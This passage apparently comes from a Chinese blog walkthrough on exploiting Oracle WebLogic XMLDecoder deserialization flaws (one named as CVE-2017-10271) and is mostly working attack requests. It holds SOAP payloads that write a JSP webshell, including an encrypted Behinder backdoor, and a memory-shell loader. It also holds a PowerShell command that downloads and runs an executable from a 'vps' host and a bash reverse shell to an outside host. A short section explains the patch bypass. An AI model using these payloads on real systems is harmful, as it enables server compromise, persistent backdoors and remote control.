class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>成功执行：</p><p><img src="/../../../blog_image/image-20240502173532361-1717164228330-18.png" alt="image-20240502173532361"></p><h3 id="写入webshell："><a href="#写入webshell：" class="headerlink" title="写入webshell："></a>写入webshell：</h3><p>写入webshell：</p><p>string中是固定的一套，其中需要改的是test1.jsp，表示这个文件的名字，bea_wls_internal表示的是文件的目录。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br></code></pre></td></tr></table></figure><p>写入一个jsp，内容是&lt;% out.print(“test hello”); %&gt;，访问目录是<code>ip:7001/bea_wls_internal/test1.jsp</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;println&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><br>                            &lt;![CDATA[<br> &lt;% out.print(&quot;test hello&quot;); %&gt;<br> ]]&gt;<br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;close&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240502175645629-1717164228330-19.png" alt="image-20240502175645629"></p><p>改成冰蝎马即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;println&quot;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span><br>                            &lt;![CDATA[<br> &lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot; %&gt;<br>&lt;%!<br>    class U extends ClassLoader &#123;<br>        U(ClassLoader c) &#123;<br>            super(c);<br>        &#125;<br><br>        public Class g(byte[] b) &#123;<br>            return super.defineClass(b, 0, b.length);<br>        &#125;<br>    &#125;<br>%&gt;&lt;%<br>    if (request.getMethod().equals(&quot;POST&quot;)) &#123;<br>        String k = &quot;e45e329feb5d925b&quot;;<br>        session.putValue(&quot;u&quot;, k);<br>        Cipher c = Cipher.getInstance(&quot;AES&quot;);<br>        c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;));<br>        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);<br>    &#125;<br>%&gt;<br> ]]&gt;<br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;close&quot;</span>/&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>很3q啊，直接使用冰蝎4.0的马是不能访问的，但是使用冰蝎3.0生成的马是可以连接上的，而且冰蝎4.0和3.0客户端都可以正常连接。</p><p><img src="/../../../blog_image/image-20240504220419307-1717164228330-20.png" alt="image-20240504220419307"></p><h3 id="注入内存马："><a href="#注入内存马：" class="headerlink" title="注入内存马："></a>注入内存马：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.8.131:7001<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>ADMINCONSOLESESSION=8pd6m22GRYpf2N3QRGkGMhZS5tGvQhQspHv2G5zqy1QDDsPf5SnQ!2021140150<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19007<br><br><span class="language-vbscript-html"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">        <span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">            <span class="hljs-tag">&lt;<span class="hljs-name">java</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                <span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.io.PrintWriter&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test5.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;println&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                            &lt;![CDATA[</span></span><br><span class="language-xml"><span class="language-vbscript-html"> </span><span class="language-vbscript">&lt;%</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">    ClassLoader classLoader = Thread.currentThread().getContextClassLoader();</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">    try&#123;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        classLoader.loadClass(<span class="hljs-string">&quot;org.junit.e.ThreadUtil&quot;</span>).newInstance();</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">    &#125;catch (Exception e)&#123;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        java.lang.reflect.Method defineClass = ClassLoader.<span class="hljs-keyword">class</span>.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, byte[].<span class="hljs-keyword">class</span>, int.<span class="hljs-keyword">class</span>, int.<span class="hljs-keyword">class</span>);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        defineClass.setAccessible(<span class="hljs-literal">true</span>);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        String bytecodeBase64 = <span class="hljs-string">&quot;&quot;</span>;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        byte[] bytecode = <span class="hljs-literal">null</span>;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        try &#123;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            <span class="hljs-keyword">Class</span> base64Clz = classLoader.loadClass(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            <span class="hljs-keyword">Class</span> decoderClz = classLoader.loadClass(<span class="hljs-string">&quot;java.util.Base64$Decoder&quot;</span>);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            Object decoder = base64Clz.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>).invoke(base64Clz);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            bytecode = (byte[]) decoderClz.getMethod(<span class="hljs-string">&quot;decode&quot;</span>, String.<span class="hljs-keyword">class</span>).invoke(decoder, bytecodeBase64);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        &#125; catch (ClassNotFoundException ee) &#123;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            <span class="hljs-keyword">Class</span> datatypeConverterClz = classLoader.loadClass(<span class="hljs-string">&quot;javax.xml.bind.DatatypeConverter&quot;</span>);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">            bytecode = (byte[]) datatypeConverterClz.getMethod(<span class="hljs-string">&quot;parseBase64Binary&quot;</span>, String.<span class="hljs-keyword">class</span>).invoke(datatypeConverterClz, bytecodeBase64);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        &#125;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        <span class="hljs-keyword">Class</span> clazz = (<span class="hljs-keyword">Class</span>)defineClass.invoke(classLoader,bytecode,<span class="hljs-number">0</span>,bytecode.length);</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">        clazz.newInstance();</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">    &#125;</span></span><br><span class="language-vbscript"><span class="language-vbscript-html">%&gt;</span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-vbscript-html"> ]]&gt;</span></span><br><span class="language-xml"><span class="language-vbscript-html">                        <span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                    <span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                    <span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;close&quot;</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">                <span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">            <span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">        <span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">    <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html">    <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-vbscript-html"></span></span><br><span class="language-xml"><span class="language-vbscript-html"></span></span><br></code></pre></td></tr></table></figure><h3 id="上线cs："><a href="#上线cs：" class="headerlink" title="上线cs："></a>上线cs：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.109.159:7001<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>709<br><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:<span class="hljs-keyword">Header</span>&gt;</span><br><span class="language-pgsql">&lt;<span class="hljs-keyword">work</span>:WorkContext xmlns:<span class="hljs-keyword">work</span>=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="language-pgsql">&lt;java version=&quot;1.4.0&quot; <span class="hljs-keyword">class</span>=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="language-pgsql">&lt;<span class="hljs-type">void</span> <span class="hljs-keyword">class</span>=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="language-pgsql">&lt;<span class="hljs-keyword">array</span> <span class="hljs-keyword">class</span>=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="language-pgsql">&lt;<span class="hljs-type">void</span> <span class="hljs-keyword">index</span>=&quot;0&quot;&gt;</span><br><span class="language-pgsql">&lt;string&gt;powershell&lt;/string&gt;</span><br><span class="language-pgsql"> &lt;/<span class="hljs-type">void</span>&gt;</span><br><span class="language-pgsql"> &lt;<span class="hljs-type">void</span> <span class="hljs-keyword">index</span>=&quot;1&quot;&gt;</span><br><span class="language-pgsql"> &lt;string&gt;-Command&lt;/string&gt;</span><br><span class="language-pgsql"> &lt;/<span class="hljs-type">void</span>&gt;</span><br><span class="language-pgsql"> &lt;<span class="hljs-type">void</span> <span class="hljs-keyword">index</span>=&quot;2&quot;&gt;</span><br><span class="language-pgsql"> &lt;string&gt;(<span class="hljs-built_in">new</span>-<span class="hljs-keyword">object</span> <span class="hljs-keyword">System</span>.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://vps/test.exe&#x27;</span>,<span class="hljs-string">&#x27;test.exe&#x27;</span>);<span class="hljs-keyword">start</span>-process test.exe&lt;/string&gt;</span><br><span class="language-pgsql">&lt;/<span class="hljs-type">void</span>&gt;</span><br><span class="language-pgsql">&lt;/<span class="hljs-keyword">array</span>&gt;</span><br><span class="language-pgsql">&lt;<span class="hljs-type">void</span> <span class="hljs-keyword">method</span>=&quot;start&quot;/&gt;&lt;/<span class="hljs-type">void</span>&gt;</span><br><span class="language-pgsql">&lt;/java&gt;</span><br><span class="language-pgsql">&lt;/<span class="hljs-keyword">work</span>:WorkContext&gt;</span><br><span class="language-pgsql">&lt;/soapenv:<span class="hljs-keyword">Header</span>&gt;</span><br><span class="language-pgsql">&lt;soapenv:Body/&gt;</span><br><span class="language-pgsql">&lt;/soapenv:Envelope&gt;</span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><h1 id="3-XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#3-XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="3. XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>3. XMLDecoder反序列化漏洞（CVE-2017-10271）</h1><h2 id="3-1-漏洞简述："><a href="#3-1-漏洞简述：" class="headerlink" title="3.1 漏洞简述："></a>3.1 漏洞简述：</h2><p>XMLDecoder反序列化漏洞(CVE-2017-10271)</p><h2 id="3-2-漏洞原理："><a href="#3-2-漏洞原理：" class="headerlink" title="3.2 漏洞原理："></a>3.2 漏洞原理：</h2><p>在CVE-2017-3506之前，不对payload进行验证，使用object tag可以RCE，CVE-2017-3506的补丁在<code>weblogic/wsee/workarea/WorkContextXmlInputAdapter.java</code>中添加了validate方法，在解析xml时，Element字段出现object tag就抛出运行时异常，不过这次防护力度不够，导致了CVE-2017-10271，利用方式类似，使用了void tag进行RCE，于是CVE-2017-10271的补丁将object、new、method关键字加入黑名单，针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对array元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常。总之，这次的补丁基本上限定了不能生成java实例。</p><h2 id="3-3-漏洞复现："><a href="#3-3-漏洞复现：" class="headerlink" title="3.3 漏洞复现："></a>3.3 漏洞复现：</h2><p>同理访问以下目录，查看是否存在该组件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationPortTypeRPC<br><span class="hljs-regexp">/wls-wsat/</span>ParticipantPortType<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationRequesterPortType<br><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType11<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationPortTypeRPC11<br><span class="hljs-regexp">/wls-wsat/</span>ParticipantPortType11<br><span class="hljs-regexp">/wls-wsat/</span>RegistrationRequesterPortType11<br></code></pre></td></tr></table></figure><p>不能直接写入webshell，但还是可以命令执行，如下面的反弹shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wls-wsat/CoordinatorPortType</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.48.128:7001<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/xml<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=JMJrmzFBldv08fCWpQh7h1pJGgPXp5JKnX6TvTJwfJlKR4xTLqDm!1531624274; ADMINCONSOLESESSION=k3svmzcTyTqfmkSpKLDXlZ685Jhn7r9PNPRKLPTyJ2PpgPvrLFrM!1392171740<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>641<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">work:WorkContext</span> <span class="hljs-attr">xmlns:work</span>=<span class="hljs-string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">java</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.4.0&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">array</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span> <span class="hljs-attr">length</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>/bin/bash<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">index</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>bash -i <span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span> /dev/tcp/vps/端口 0<span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span></span><br><span 